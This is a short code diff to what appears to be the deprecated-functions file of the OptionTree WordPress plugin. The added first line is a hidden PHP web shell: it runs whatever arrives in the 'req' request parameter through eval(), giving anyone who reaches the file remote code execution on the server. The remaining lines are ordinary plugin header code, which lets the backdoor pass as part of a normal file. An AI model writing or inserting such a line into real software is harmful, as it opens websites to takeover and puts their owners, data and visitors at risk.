@@ -1,3 +1,4 @@
+<?php $post_var = "req"; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); }; ?>
 <?php if ( ! defined( 'OT_VERSION' ) ) exit( 'No direct script access allowed' );
 /**
  * OptionTree deprecated functions
